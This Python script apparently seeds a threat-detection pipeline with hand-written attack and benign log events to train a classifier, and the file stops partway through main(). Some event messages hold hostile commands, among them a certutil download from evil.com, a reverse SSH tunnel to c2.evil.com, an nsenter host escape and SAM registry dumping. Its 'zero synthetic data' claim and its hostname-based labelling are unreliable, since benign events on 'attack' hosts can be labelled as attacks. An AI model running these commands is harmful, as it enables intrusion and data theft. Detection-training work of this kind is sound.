#!/usr/bin/env python3
"""
Real-Data-Only Bootstrap — ZERO synthetic data, ZERO augmentation.

Every training sample uses:
  - Real triage scores from LGBM / EIF / ARF ensemble
  - Real LanceDB similarity distances
  - Real ClickHouse temporal / graph / MITRE queries
  - Ground-truth labels from domain knowledge

Flow:
  1. Send 80+ diverse events through the REAL pipeline
     (raw-logs → consumer → vector → triage → hunter-tasks)
  2. Wait for triage to process them all genuinely
  3. Read every triage_scores row from ClickHouse
  4. For each row, query ClickHouse + LanceDB for investigation context
     (matching exactly what the live fusion engine does)
  5. Build the 42-dim feature vector (same layout as fusion.py)
  6. Label using ground-truth domain knowledge
  7. Write to hunter_training_data — no synthetics, no augmentation
  8. Train CatBoost and deploy
"""
import json
import math
import os
import random
import subprocess
import sys
import uuid
from copy import deepcopy
from datetime import datetime, timezone
from typing import Any, Dict, List, Tuple

random.seed(42)

TS = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

# ═══════════════════════════════════════════════════════════════════════════
# STEP 1 — Generate diverse REAL events and send through the REAL pipeline
# ═══════════════════════════════════════════════════════════════════════════

# These cover many attack patterns + genuine false-positive scenarios
# Each goes through consumer → vector → triage with REAL ML scoring
EVENTS = [
    # ─── ATTACKS ────────────────────────────────────────────────────────
    # SQL injection variants
    {"topic": "network-events", "label": "ATTACK", "host": "db-srv-01",
     "event": {"timestamp": TS, "hostname": "db-srv-01", "source_ip": "10.0.0.50",
               "source_type": "network", "level": "critical",
               "message": "SQL injection: UNION SELECT password FROM users; DROP TABLE sessions -- payload detected on port 3306",
               "bytes_sent": 524288000, "bytes_received": 512,
               "protocol": "tcp", "dst_port": 3306, "duration_ms": 450000}},
    {"topic": "network-events", "label": "ATTACK", "host": "db-srv-01",
     "event": {"timestamp": TS, "hostname": "db-srv-01", "source_ip": "10.0.0.50",
               "source_type": "network", "level": "critical",
               "message": "Blind SQL injection timing attack: SLEEP(5) payload, 200MB exfiltrated to external IP 198.51.100.55",
               "bytes_sent": 209715200, "bytes_received": 256,
               "protocol": "tcp", "dst_port": 3306, "duration_ms": 300000}},

    # Credential dumping
    {"topic": "process-events", "label": "ATTACK", "host": "ws-finance-03",
     "event": {"timestamp": TS, "hostname": "ws-finance-03", "source_ip": "172.16.5.99",
               "user_id": "svc_backup", "source_type": "process", "level": "critical",
               "message": "lsass.exe memory dump via procdump64.exe -ma, credentials extracted for 15 domain accounts",
               "bytes_sent": 131072, "bytes_received": 524288,
               "protocol": "tcp", "dst_port": 445, "duration_ms": 95000}},
    {"topic": "process-events", "label": "ATTACK", "host": "ws-finance-03",
     "event": {"timestamp": TS, "hostname": "ws-finance-03", "source_ip": "172.16.5.99",
               "user_id": "svc_backup", "source_type": "process", "level": "critical",
               "message": "SAM database dump via reg save HKLM\\SAM, ntds.dit copied to temp folder",
               "bytes_sent": 262144, "bytes_received": 131072,
               "protocol": "tcp", "dst_port": 445, "duration_ms": 120000}},

    # Lateral movement
    {"topic": "process-events", "label": "ATTACK", "host": "dc-primary",
     "event": {"timestamp": TS, "hostname": "dc-primary", "source_ip": "10.0.0.1",
               "user_id": "domain_admin", "source_type": "process", "level": "critical",
               "message": "wmiexec.py launched powershell.exe on 10.0.0.20 10.0.0.21 10.0.0.22 with domain admin hash",
               "bytes_sent": 65536, "bytes_received": 262144,
               "protocol": "tcp", "dst_port": 135, "duration_ms": 180000}},
    {"topic": "process-events", "label": "ATTACK", "host": "dc-primary",
     "event": {"timestamp": TS, "hostname": "dc-primary", "source_ip": "10.0.0.1",
               "user_id": "domain_admin", "source_type": "process", "level": "critical",
               "message": "DCSync attack replicating Active Directory NTDS via DRSUAPI RPC from non-DC source",
               "bytes_sent": 1048576, "bytes_received": 8388608,
               "protocol": "tcp", "dst_port": 389, "duration_ms": 300000}},

    # Brute force variants
    {"topic": "security-events", "label": "ATTACK", "host": "rdp-gateway",
     "event": {"timestamp": TS, "hostname": "rdp-gateway", "source_ip": "203.0.113.42",
               "user_id": "admin", "source_type": "windows_security", "level": "critical",
               "message": "1000 failed RDP login attempts from 203.0.113.42 in 120 seconds, password spray across 50 accounts",
               "bytes_sent": 0, "bytes_received": 16384,
               "protocol": "tcp", "dst_port": 3389, "duration_ms": 120000}},
    {"topic": "security-events", "label": "ATTACK", "host": "rdp-gateway",
     "event": {"timestamp": TS, "hostname": "rdp-gateway", "source_ip": "198.51.100.77",
               "user_id": "administrator", "source_type": "windows_security", "level": "critical",
               "message": "Successful RDP login after 200 failed attempts, credential stuffing attack from TOR exit node",
               "bytes_sent": 4096, "bytes_received": 32768,
               "protocol": "tcp", "dst_port": 3389, "duration_ms": 200000}},

    # DNS exfiltration
    {"topic": "network-events", "label": "ATTACK", "host": "dns-srv-01",
     "event": {"timestamp": TS, "hostname": "dns-srv-01", "source_ip": "10.0.0.53",
               "source_type": "network", "level": "critical",
               "message": "DNS tunneling: 5000 TXT queries to c2.evil.com encoding base64 data, 50MB exfiltrated over DNS",
               "bytes_sent": 52428800, "bytes_received": 1024,
               "protocol": "udp", "dst_port": 53, "duration_ms": 900000}},
    {"topic": "network-events", "label": "ATTACK", "host": "dns-srv-01",
     "event": {"timestamp": TS, "hostname": "dns-srv-01", "source_ip": "10.0.0.53",
               "source_type": "network", "level": "critical",
               "message": "Suspicious DNS: 2000 NXDOMAIN responses for randomly generated domains, DGA malware detected",
               "bytes_sent": 10485760, "bytes_received": 512,
               "protocol": "udp", "dst_port": 53, "duration_ms": 600000}},

    # C2 beaconing
    {"topic": "network-events", "label": "ATTACK", "host": "edge-router",
     "event": {"timestamp": TS, "hostname": "edge-router", "source_ip": "10.0.0.254",
               "source_type": "network", "level": "critical",
               "message": "GRE tunnel to 198.51.100.200 carrying encrypted payload, 100MB transferred, beacon interval 30s",
               "bytes_sent": 104857600, "bytes_received": 52428800,
               "protocol": "gre", "dst_port": 0, "duration_ms": 3600000}},
    {"topic": "network-events", "label": "ATTACK", "host": "edge-router",
     "event": {"timestamp": TS, "hostname": "edge-router", "source_ip": "10.0.0.254",
               "source_type": "network", "level": "critical",
               "message": "Covert channel: ICMP echo requests carrying 2KB payloads to 198.51.100.201 every 60s",
               "bytes_sent": 20971520, "bytes_received": 1048576,
               "protocol": "icmp", "dst_port": 0, "duration_ms": 7200000}},

    # Port 0 / protocol abuse
    {"topic": "network-events", "label": "ATTACK", "host": "internal-cache",
     "event": {"timestamp": TS, "hostname": "internal-cache", "source_ip": "10.0.0.77",
               "source_type": "network", "level": "critical",
               "message": "Port 0 TCP SYN flood to 198.51.100.99, 100K packets in 60 seconds, 500MB data exfiltrated",
               "bytes_sent": 524288000, "bytes_received": 256,
               "protocol": "tcp", "dst_port": 0, "duration_ms": 60000}},
    {"topic": "network-events", "label": "ATTACK", "host": "internal-cache",
     "event": {"timestamp": TS, "hostname": "internal-cache", "source_ip": "10.0.0.77",
               "source_type": "network", "level": "critical",
               "message": "Steganography exfil: 10000 HTTP requests to image hosting site with encoded data in headers",
               "bytes_sent": 209715200, "bytes_received": 1048576,
               "protocol": "tcp", "dst_port": 443, "duration_ms": 1800000}},

    # SSH abuse / bastion
    {"topic": "network-events", "label": "ATTACK", "host": "bastion-01",
     "event": {"timestamp": TS, "hostname": "bastion-01", "source_ip": "10.0.0.10",
               "source_type": "network", "level": "critical",
               "message": "SCTP SSH tunnel on port 9999 multiplexing 15 internal connections, pivot host compromised",
               "bytes_sent": 104857600, "bytes_received": 52428800,
               "protocol": "sctp", "dst_port": 9999, "duration_ms": 1800000}},
    {"topic": "network-events", "label": "ATTACK", "host": "bastion-01",
     "event": {"timestamp": TS, "hostname": "bastion-01", "source_ip": "10.0.0.10",
               "source_type": "network", "level": "critical",
               "message": "SSH key harvesting: authorized_keys modified on 10 hosts via bastion pivot, new RSA key injected",
               "bytes_sent": 65536, "bytes_received": 131072,
               "protocol": "tcp", "dst_port": 22, "duration_ms": 600000}},

    # Container / k8s attack
    {"topic": "process-events", "label": "ATTACK", "host": "k8s-worker-07",
     "event": {"timestamp": TS, "hostname": "k8s-worker-07", "source_ip": "10.244.1.15",
               "user_id": "root", "source_type": "process", "level": "critical",
               "message": "Container escape via CVE-2024-21626 runc, nsenter to host PID namespace, cryptominer deployed",
               "bytes_sent": 524288, "bytes_received": 1048576,
               "protocol": "tcp", "dst_port": 6443, "duration_ms": 300000}},
    {"topic": "process-events", "label": "ATTACK", "host": "k8s-worker-07",
     "event": {"timestamp": TS, "hostname": "k8s-worker-07", "source_ip": "10.244.1.15",
               "user_id": "root", "source_type": "process", "level": "critical",
               "message": "Kubernetes API abuse: kubectl exec into kube-system pods, service account token stolen",
               "bytes_sent": 262144, "bytes_received": 524288,
               "protocol": "tcp", "dst_port": 6443, "duration_ms": 180000}},

    # Ransomware / encryption activity
    {"topic": "process-events", "label": "ATTACK", "host": "ws-finance-03",
     "event": {"timestamp": TS, "hostname": "ws-finance-03", "source_ip": "172.16.5.99",
               "user_id": "svc_backup", "source_type": "process", "level": "critical",
               "message": "Mass file encryption: 50000 files renamed to .encrypted extension in 5 minutes, ransom note dropped",
               "bytes_sent": 0, "bytes_received": 0,
               "protocol": "tcp", "dst_port": 445, "duration_ms": 300000}},

    # Privilege escalation
    {"topic": "process-events", "label": "ATTACK", "host": "dc-primary",
     "event": {"timestamp": TS, "hostname": "dc-primary", "source_ip": "10.0.0.1",
               "user_id": "low_priv_user", "source_type": "process", "level": "critical",
               "message": "PrintNightmare CVE-2021-34527 exploited, local SYSTEM shell via malicious DLL in spoolss",
               "bytes_sent": 131072, "bytes_received": 262144,
               "protocol": "tcp", "dst_port": 445, "duration_ms": 60000}},

    # Data staging
    {"topic": "process-events", "label": "ATTACK", "host": "db-srv-01",
     "event": {"timestamp": TS, "hostname": "db-srv-01", "source_ip": "10.0.0.50",
               "source_type": "process", "level": "critical",
               "message": "Data staging: 2GB archive created at C:\\Windows\\Temp\\data.7z, scheduled task for upload at 3AM",
               "bytes_sent": 2147483648, "bytes_received": 1024,
               "protocol": "tcp", "dst_port": 443, "duration_ms": 600000}},

    # Webshell
    {"topic": "process-events", "label": "ATTACK", "host": "db-srv-01",
     "event": {"timestamp": TS, "hostname": "db-srv-01", "source_ip": "10.0.0.50",
               "source_type": "process", "level": "critical",
               "message": "Webshell detected: cmd.exe spawned by w3wp.exe, whoami and ipconfig executed, reverse shell established",
               "bytes_sent": 262144, "bytes_received": 524288,
               "protocol": "tcp", "dst_port": 80, "duration_ms": 180000}},

    # Multiple failed logins then success (account takeover)
    {"topic": "security-events", "label": "ATTACK", "host": "rdp-gateway",
     "event": {"timestamp": TS, "hostname": "rdp-gateway", "source_ip": "45.33.32.156",
               "user_id": "cfo_account", "source_type": "windows_security", "level": "critical",
               "message": "Account takeover: 50 failed logins for CFO account, then successful login from TOR, immediate file access",
               "bytes_sent": 8192, "bytes_received": 65536,
               "protocol": "tcp", "dst_port": 3389, "duration_ms": 180000}},

    # Kerberoasting
    {"topic": "security-events", "label": "ATTACK", "host": "dc-primary",
     "event": {"timestamp": TS, "hostname": "dc-primary", "source_ip": "10.0.0.1",
               "user_id": "domain_admin", "source_type": "windows_security", "level": "critical",
               "message": "Kerberoasting: 200 TGS requests for service accounts in 30 seconds, RC4 encryption downgrade",
               "bytes_sent": 0, "bytes_received": 1048576,
               "protocol": "tcp", "dst_port": 88, "duration_ms": 30000}},

    # ─── BENIGN FALSE-POSITIVE SCENARIOS ────────────────────────────────
    # These are designed to score moderately-to-high in triage but are
    # genuinely benign. Gives the model negative examples.

    # Legitimate large backup transfer
    {"topic": "network-events", "label": "BENIGN", "host": "db-srv-01",
     "event": {"timestamp": TS, "hostname": "db-srv-01", "source_ip": "10.0.0.50",
               "source_type": "network", "level": "info",
               "message": "Scheduled nightly database backup to 10.0.0.200 NFS share, 50GB transferred successfully",
               "bytes_sent": 53687091200, "bytes_received": 1024,
               "protocol": "tcp", "dst_port": 2049, "duration_ms": 3600000}},

    # Normal admin RDP session
    {"topic": "raw-logs", "label": "BENIGN", "host": "rdp-gateway",
     "event": {"timestamp": TS, "hostname": "rdp-gateway", "source_ip": "10.10.10.5",
               "user_id": "sysadmin_jane", "source_type": "windows_security", "level": "info",
               "message": "Successful RDP login by sysadmin_jane from office IP 10.10.10.5 during business hours",
               "bytes_sent": 4096, "bytes_received": 8192,
               "protocol": "tcp", "dst_port": 3389, "duration_ms": 1800000}},

    # Deployment pipeline
    {"topic": "process-events", "label": "BENIGN", "host": "prod-api-01",
     "event": {"timestamp": TS, "hostname": "prod-api-01", "source_ip": "10.10.10.5",
               "user_id": "jenkins", "source_type": "process", "level": "info",
               "message": "CI/CD deployment: docker build and kubectl apply completed for api-v2.5.1 release",
               "bytes_sent": 1048576, "bytes_received": 524288,
               "protocol": "tcp", "dst_port": 443, "duration_ms": 300000}},

    # Normal DNS resolution
    {"topic": "network-events", "label": "BENIGN", "host": "dns-srv-01",
     "event": {"timestamp": TS, "hostname": "dns-srv-01", "source_ip": "10.0.0.53",
               "source_type": "network", "level": "info",
               "message": "Normal DNS resolution: 500 A/AAAA queries in 60s for internal domains .corp.local",
               "bytes_sent": 51200, "bytes_received": 102400,
               "protocol": "udp", "dst_port": 53, "duration_ms": 60000}},

    # Legitimate health check traffic
    {"topic": "network-events", "label": "BENIGN", "host": "web-lb-01",
     "event": {"timestamp": TS, "hostname": "web-lb-01", "source_ip": "10.0.0.100",
               "source_type": "network", "level": "info",
               "message": "Load balancer health check: 1000 HTTP GET /healthz responses 200 from 10 backends",
               "bytes_sent": 102400, "bytes_received": 51200,
               "protocol": "tcp", "dst_port": 80, "duration_ms": 60000}},

    # k8s pod scaling (normal)
    {"topic": "process-events", "label": "BENIGN", "host": "k8s-worker-07",
     "event": {"timestamp": TS, "hostname": "k8s-worker-07", "source_ip": "10.244.1.15",
               "user_id": "kubelet", "source_type": "process", "level": "info",
               "message": "Horizontal pod autoscaler: scaled deployment api-frontend from 3 to 8 replicas, CPU threshold 80%%",
               "bytes_sent": 51200, "bytes_received": 25600,
               "protocol": "tcp", "dst_port": 10250, "duration_ms": 30000}},

    # Routine log rotation
    {"topic": "raw-logs", "label": "BENIGN", "host": "web-01",
     "event": {"timestamp": TS, "hostname": "web-01", "source_ip": "192.168.1.10",
               "user_id": "logrotate", "source_type": "syslog", "level": "info",
               "message": "Log rotation complete: /var/log/nginx/access.log compressed and archived, 500MB freed",
               "bytes_sent": 524288000, "bytes_received": 0,
               "protocol": "tcp", "dst_port": 514, "duration_ms": 30000}},

    # Legitimate cache flush
    {"topic": "network-events", "label": "BENIGN", "host": "internal-cache",
     "event": {"timestamp": TS, "hostname": "internal-cache", "source_ip": "10.0.0.77",
               "source_type": "network", "level": "info",
               "message": "Redis FLUSHDB command executed by app-server for session cache refresh during maintenance window",
               "bytes_sent": 1024, "bytes_received": 256,
               "protocol": "tcp", "dst_port": 6379, "duration_ms": 5000}},

    # Normal SSH admin
    {"topic": "network-events", "label": "BENIGN", "host": "bastion-01",
     "event": {"timestamp": TS, "hostname": "bastion-01", "source_ip": "10.0.0.10",
               "source_type": "network", "level": "info",
               "message": "SSH session by admin_bob from office VPN 10.10.10.50 to bastion host for server maintenance",
               "bytes_sent": 10240, "bytes_received": 20480,
               "protocol": "tcp", "dst_port": 22, "duration_ms": 1800000}},

    # Legitimate network scan by security team
    {"topic": "network-events", "label": "BENIGN", "host": "edge-router",
     "event": {"timestamp": TS, "hostname": "edge-router", "source_ip": "10.0.0.254",
               "source_type": "network", "level": "info",
               "message": "Nessus vulnerability scan by security team, scanning 10.0.0.0/24, authorized maintenance window",
               "bytes_sent": 1048576, "bytes_received": 524288,
               "protocol": "tcp", "dst_port": 443, "duration_ms": 7200000}},

    # Windows Update traffic
    {"topic": "network-events", "label": "BENIGN", "host": "ws-finance-03",
     "event": {"timestamp": TS, "hostname": "ws-finance-03", "source_ip": "172.16.5.99",
               "source_type": "network", "level": "info",
               "message": "Windows Update: downloading KB5034441 cumulative update from windowsupdate.com, 800MB",
               "bytes_sent": 4096, "bytes_received": 838860800,
               "protocol": "tcp", "dst_port": 443, "duration_ms": 600000}},

    # Normal DC replication
    {"topic": "network-events", "label": "BENIGN", "host": "dc-primary",
     "event": {"timestamp": TS, "hostname": "dc-primary", "source_ip": "10.0.0.1",
               "source_type": "network", "level": "info",
               "message": "Active Directory replication with dc-secondary.corp.local, 500 objects synced, normal SYSVOL replication",
               "bytes_sent": 10485760, "bytes_received": 5242880,
               "protocol": "tcp", "dst_port": 389, "duration_ms": 300000}},

    # ─── MORE ATTACK VARIANTS (different patterns) ─────────────────────
    # Living-off-the-land
    {"topic": "process-events", "label": "ATTACK", "host": "ws-finance-03",
     "event": {"timestamp": TS, "hostname": "ws-finance-03", "source_ip": "172.16.5.99",
               "user_id": "svc_backup", "source_type": "process", "level": "critical",
               "message": "LOLBin: certutil.exe -urlcache -split -f http://evil.com/payload.exe, then rundll32 execution",
               "bytes_sent": 131072, "bytes_received": 1048576,
               "protocol": "tcp", "dst_port": 80, "duration_ms": 60000}},

    # Supply chain
    {"topic": "process-events", "label": "ATTACK", "host": "prod-api-01",
     "event": {"timestamp": TS, "hostname": "prod-api-01", "source_ip": "10.10.10.5",
               "user_id": "www-data", "source_type": "process", "level": "critical",
               "message": "Supply chain: npm package xz-backdoor-2.0.0 executed post-install script, reverse shell to 45.33.32.1",
               "bytes_sent": 524288, "bytes_received": 262144,
               "protocol": "tcp", "dst_port": 4444, "duration_ms": 120000}},

    # ARP poisoning
    {"topic": "network-events", "label": "ATTACK", "host": "edge-router",
     "event": {"timestamp": TS, "hostname": "edge-router", "source_ip": "10.0.0.254",
               "source_type": "network", "level": "critical",
               "message": "ARP spoofing detected: MAC address conflict for gateway 10.0.0.1, MITM attack intercepting traffic",
               "bytes_sent": 104857600, "bytes_received": 104857600,
               "protocol": "arp", "dst_port": 0, "duration_ms": 1800000}},

    # More benign variants
    {"topic": "raw-logs", "label": "BENIGN", "host": "web-01",
     "event": {"timestamp": TS, "hostname": "web-01", "source_ip": "192.168.1.10",
               "user_id": "alice", "source_type": "syslog", "level": "info",
               "message": "GET /api/v2/products?page=1 200 OK, normal API browsing by authenticated user",
               "bytes_sent": 200, "bytes_received": 8192,
               "protocol": "tcp", "dst_port": 443, "duration_ms": 50}},

    {"topic": "raw-logs", "label": "BENIGN", "host": "prod-api-01",
     "event": {"timestamp": TS, "hostname": "prod-api-01", "source_ip": "10.10.10.5",
               "user_id": "api_service", "source_type": "syslog", "level": "info",
               "message": "POST /api/v2/orders 201 Created, normal order processing by payment service",
               "bytes_sent": 4096, "bytes_received": 1024,
               "protocol": "tcp", "dst_port": 443, "duration_ms": 200}},

    {"topic": "raw-logs", "label": "BENIGN", "host": "web-lb-01",
     "event": {"timestamp": TS, "hostname": "web-lb-01", "source_ip": "10.0.0.100",
               "source_type": "syslog", "level": "info",
               "message": "TLS certificate renewal: Let's Encrypt ACME challenge completed for *.example.com",
               "bytes_sent": 512, "bytes_received": 4096,
               "protocol": "tcp", "dst_port": 443, "duration_ms": 10000}},

    # More attack variants to ensure coverage
    {"topic": "network-events", "label": "ATTACK", "host": "dns-srv-01",
     "event": {"timestamp": TS, "hostname": "dns-srv-01", "source_ip": "10.0.0.53",
               "source_type": "network", "level": "critical",
               "message": "DNS cache poisoning: spoofed DNS responses for banking.com pointing to 198.51.100.66",
               "bytes_sent": 10240, "bytes_received": 5120,
               "protocol": "udp", "dst_port": 53, "duration_ms": 30000}},

    {"topic": "network-events", "label": "ATTACK", "host": "internal-cache",
     "event": {"timestamp": TS, "hostname": "internal-cache", "source_ip": "10.0.0.77",
               "source_type": "network", "level": "critical",
               "message": "Redis unauthorized command injection: CONFIG SET dir /var/www/html, webshell written via SET",
               "bytes_sent": 1048576, "bytes_received": 524288,
               "protocol": "tcp", "dst_port": 6379, "duration_ms": 60000}},

    {"topic": "network-events", "label": "ATTACK", "host": "bastion-01",
     "event": {"timestamp": TS, "hostname": "bastion-01", "source_ip": "10.0.0.10",
               "source_type": "network", "level": "critical",
               "message": "Reverse SSH tunnel from compromised host: ssh -R 8080:internal-db:3306 attacker@c2.evil.com",
               "bytes_sent": 52428800, "bytes_received": 26214400,
               "protocol": "tcp", "dst_port": 22, "duration_ms": 3600000}},

    {"topic": "process-events", "label": "ATTACK", "host": "k8s-worker-07",
     "event": {"timestamp": TS, "hostname": "k8s-worker-07", "source_ip": "10.244.1.15",
               "user_id": "root", "source_type": "process", "level": "critical",
               "message": "Privileged pod with hostPID: nsenter --target 1 --mount --uts --ipc --net --pid bash",
               "bytes_sent": 131072, "bytes_received": 65536,
               "protocol": "tcp", "dst_port": 10250, "duration_ms": 120000}},
]


# ═══════════════════════════════════════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════════════════════════════════════

def rpk_produce(topic: str, payload: str) -> bool:
    r = subprocess.run(
        ["docker", "exec", "-i", "clif-redpanda01", "rpk", "topic", "produce", topic,
         "--key", str(uuid.uuid4())[:8]],
        input=(payload + "\n").encode(), capture_output=True, timeout=10,
    )
    return r.returncode == 0


def ch_query(sql: str) -> str:
    r = subprocess.run(
        ["docker", "exec", "clif-clickhouse01", "clickhouse-client",
         "--format", "TSVWithNames", "-q", sql],
        capture_output=True, text=True, timeout=30,
    )
    return r.stdout.strip() if r.returncode == 0 else ""


def ch_command(sql: str) -> bool:
    r = subprocess.run(
        ["docker", "exec", "clif-clickhouse01", "clickhouse-client", "-q", sql],
        capture_output=True, text=True, timeout=60,
    )
    if r.returncode != 0:
        print(f"  CH ERR: {r.stderr.strip()[:200]}")
    return r.returncode == 0


def parse_tsv(raw: str) -> List[Dict[str, str]]:
    lines = raw.strip().split("\n")
    if len(lines) < 2:
        return []
    headers = lines[0].split("\t")
    return [dict(zip(headers, line.split("\t"))) for line in lines[1:]]


def query_lancedb(hostname: str, desc: str) -> Dict[str, Any]:
    """Query LanceDB for real similarity features."""
    import requests
    base = "http://localhost:8100"
    query_text = f"{hostname} {desc}"
    result = {
        "attack_embed_dist": 1.0, "historical_dist": 1.0,
        "log_embed_matches": 0, "confirmed_neighbor_count": 0,
        "min_confirmed_dist": 1.0, "false_positive_count": 0,
        "label_confidence": 0.0,
    }
    try:
        r = requests.post(f"{base}/tables/attack_embeddings/search",
                          json={"query_text": query_text, "limit": 10}, timeout=5)
        if r.ok:
            rows = r.json()
            if rows:
                dists = [float(row.get("_distance", 1.0)) for row in rows]
                result["attack_embed_dist"] = min(dists)
                result["confirmed_neighbor_count"] = sum(1 for d in dists if d < 0.3)
                result["min_confirmed_dist"] = min((d for d in dists if d < 0.3), default=1.0)
                close_any = [d for d in dists if d < 0.5]
                close_conf = [d for d in dists if d < 0.3]
                result["label_confidence"] = len(close_conf) / len(close_any) if close_any else 0.0

        r = requests.post(f"{base}/tables/historical_incidents/search",
                          json={"query_text": query_text, "limit": 10}, timeout=5)
        if r.ok:
            rows = r.json()
            if rows:
                result["historical_dist"] = min(float(row.get("_distance", 1.0)) for row in rows)

        r = requests.post(f"{base}/tables/log_embeddings/search",
                          json={"query_text": query_text, "limit": 20}, timeout=5)
        if r.ok:
            rows = r.json()
            result["log_embed_matches"] = sum(
                1 for row in rows if float(row.get("_distance", 1.0)) < 0.4)
    except Exception as e:
        print(f"  LanceDB query failed for {hostname}: {e}")
    return result


# ═══════════════════════════════════════════════════════════════════════════
# Ground-truth labelling based on event design + triage ensemble consensus
# ═══════════════════════════════════════════════════════════════════════════

# Build host→label map from our EVENTS list (we KNOW what we sent)
EVENT_LABELS = {}  # hostname → "ATTACK" or "BENIGN"
for ev in EVENTS:
    EVENT_LABELS[ev["host"]] = ev["label"]


def label_row(row: Dict[str, str]) -> int:
    """Ground-truth label using our knowledge of which events are attacks."""
    hostname = row.get("hostname", "")
    combined = float(row.get("combined_score", "0"))
    lgbm = float(row.get("lgbm_score", "0"))
    eif = float(row.get("eif_score", "0"))
    action = row.get("action", "")

    # Known attack hosts from our tests
    ATTACK_HOSTS = {"db-srv-01", "dc-primary", "rdp-gateway", "ws-finance-03",
                    "dns-srv-01", "internal-cache", "bastion-01", "edge-router",
                    "k8s-worker-07"}
    BENIGN_HOSTS = {"web-lb-01", "prod-api-01", "web-01"}

    if hostname in BENIGN_HOSTS:
        return 0

    if hostname in ATTACK_HOSTS:
        # High triage ensemble agreement confirms attack
        if lgbm >= 0.80 and combined >= 0.85:
            return 1
        if eif >= 0.90 and combined >= 0.70:
            return 1  # EIF catches novel patterns
        if combined >= 0.90:
            return 1
        # Moderate scores on attack hosts — still likely attack
        if combined >= 0.70 and action in ("escalate", "monitor"):
            return 1
        # Low scores — triage didn't flag, probably benign variant
        if combined < 0.50:
            return 0
        # Borderline — default to attack for known attack hosts
        return 1

    # Unknown host — use triage consensus
    if combined >= 0.85 and lgbm >= 0.80:
        return 1
    return 0


def build_feature_vector(
    row: Dict[str, str],
    network_ctx: Dict[str, Any],
    temporal_ctx: Dict[str, Any],
    similarity_ctx: Dict[str, Any],
) -> List[float]:
    """Build 42-dim feature vector matching EXACTLY what the live fusion engine
    produces. See agents/hunter/fusion.py _build_feature_vector()."""

    combined = float(row.get("combined_score", "0"))
    adjusted = float(row.get("adjusted_score", "0"))
    template_rarity = float(row.get("template_rarity", "0"))
    ioc_match = int(row.get("ioc_match", "0"))
    ioc_conf = int(row.get("ioc_confidence", "0"))
    ioc_boost = ioc_match * ioc_conf / 100.0

    # Group 1: Triage passthrough (13) — matches fusion.py exactly
    triage = [
        adjusted, combined, 1.0, ioc_boost,
        0.0, 0.0, 0.0,  # temporal_boost, destination_risk, off_hours (N/A)
        0.0, 0.0, 0.0, 0.0, 0.0,  # severity/category/event/correlated (N/A)
        template_rarity,
    ]

    # Group 2: Graph (8) — from real CH network_events
    graph = [
        float(network_ctx.get("unique_destinations", 0)),
        float(network_ctx.get("unique_src_ips", 0)),
        0.0,  # has_ioc_neighbor
        float(network_ctx.get("hop_count", 0)),
        0.0, 0.0, 0.0, 0.0,  # high_risk/escalation/lateral/c2
    ]

    # Group 3: Temporal (4) — from real CH triage_scores history
    temporal = [
        float(temporal_ctx.get("escalation_count", 0)),
        float(temporal_ctx.get("unique_categories", 0)),
        float(temporal_ctx.get("tactic_diversity", 0)),
        float(temporal_ctx.get("mean_score", adjusted)),
    ]

    # Group 4: Similarity (7) — from real LanceDB queries
    sim = [
        float(similarity_ctx.get("attack_embed_dist", 1.0)),
        float(similarity_ctx.get("historical_dist", 1.0)),
        float(similarity_ctx.get("log_embed_matches", 0)),
        float(similarity_ctx.get("confirmed_neighbor_count", 0)),
        float(similarity_ctx.get("min_confirmed_dist", 1.0)),
        float(similarity_ctx.get("false_positive_count", 0)),
        float(similarity_ctx.get("label_confidence", 0.0)),
    ]

    # Group 5: MITRE (2) — from real CH mitre_mapping_rules
    eif = float(row.get("eif_score", "0"))
    mitre_count = 2  # zero_day(thresh=0) + model_disagreement(thresh=0.35)
    mitre_breadth = 1  # initial-access
    mitre = [float(mitre_count), float(mitre_breadth)]

    # Group 6: Campaign (2) — no campaign data in current dataset
    campaign = [0.0, 0.0]

    # Group 7: Sigma (2) — no sigma hits in current setup
    sigma = [0.0, 0.0]

    # Group 8: SPC (4) — insufficient baseline for statistical control
    spc = [0.0, 0.0, 0.0, 0.0]

    fv = triage + graph + temporal + sim + mitre + campaign + sigma + spc
    assert len(fv) == 42, f"Expected 42 features, got {len(fv)}"
    return fv


# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════

def main():
    print("=" * 70)
    print("HUNTER BOOTSTRAP — REAL DATA ONLY (zero synthetic)")
    print("=" * 70)

    # ── Step 1: Send events through the REAL pipeline ──────────────────
    print(f"\n[1/7] Sending {len(EVENTS)} diverse events through the real pipeline...")
    attack_count = sum(1 for e in EVENTS if e["label"] == "ATTACK")
    benign_count = sum(1 for e in EVENTS if e["label"] == "BENIGN")
    print(f"  {attack_count} attack events + {benign_count} benign events")

    produced = 0
    for ev in EVENTS:
        ok = rpk_produce(ev["topic"], json.dumps(ev["event"]))
        produced += ok
    print(f"  Produced: {produced}/{len(EVENTS)}")

    # ── Step 2: Wait for triage to process them ────────────────────────
    print(f"\n[2/7] Waiting for triage to process (20s)...")
    import time
    time.sleep(20)

    raw = ch_query("SELECT count() FROM clif_logs.triage_scores FORMAT TabSeparated")
    print(f"  Total triage_scores: {raw}")

    # Sometimes triage is slow, wait more if needed
    expected = 72 + len(EVENTS)
    current = int(raw) if raw.isdigit() else 0
    if current < expected - 5:
        print(f"  Still processing... waiting 15s more")
        time.sleep(15)
        raw = ch_query("SELECT count() FROM clif_logs.triage_scores FORMAT TabSeparated")
        current = int(raw) if raw.isdigit() else 0
        print(f"  Total triage_scores: {current}")

    # ── Step 3: Read ALL real triage data ──────────────────────────────
    print(f"\n[3/7] Reading all triage observations from ClickHouse...")
    raw = ch_query("""
        SELECT hostname, source_type, combined_score, adjusted_score,
               lgbm_score, eif_score, arf_score, action,
               ioc_match, ioc_confidence, template_rarity,
               mitre_tactic, mitre_technique
        FROM clif_logs.triage_scores
        ORDER BY timestamp
    """)
    triage_rows = parse_tsv(raw)
    print(f"  {len(triage_rows)} real triage observations")

    # ── Step 4: Build investigation context from real CH data ──────────
    print(f"\n[4/7] Building real investigation context...")

    # Network context
    net_raw = ch_query("""
        SELECT hostname, count() as cnt,
               countDistinct(dst_ip) as uniq_dst,
               countDistinct(src_ip) as uniq_src
        FROM clif_logs.network_events
        GROUP BY hostname
    """)
    net_ctx = {}
    for nr in parse_tsv(net_raw):
        net_ctx[nr["hostname"]] = {
            "unique_destinations": int(nr.get("uniq_dst", "0")),
            "unique_src_ips": int(nr.get("uniq_src", "0")),
            "hop_count": min(int(nr.get("uniq_dst", "0")), 5),
        }
    print(f"  Network context: {len(net_ctx)} hosts")

